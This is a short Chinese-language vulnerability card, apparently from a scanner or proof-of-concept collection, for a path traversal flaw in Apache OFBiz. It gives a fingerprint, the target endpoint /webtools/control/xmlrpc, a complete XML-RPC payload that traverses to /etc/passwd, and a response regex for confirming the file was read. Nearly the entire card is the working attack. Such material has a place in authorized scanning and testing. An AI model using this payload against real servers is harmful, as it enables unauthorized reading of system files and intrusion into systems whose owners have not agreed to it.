# ApacheOFBiz目录遍历漏洞

ApacheOFBiz ｜ 路径遍历 ｜ —
- **指纹**：`"OFBiz"`
- **请求**：`POST /webtools/control/xmlrpc HTTP/1.1`

**Payload**
```
<?xml version="1.0"?>
<methodCall>
<methodName>example.createBlogPost</methodName>
<params>
<param>
<value><string>../../../../../../etc/passwd</string></value>
</param>
</params>
</methodCall>
```
- **响应特征**：200 ^(?=.*?root)(?=.*?bin).*?$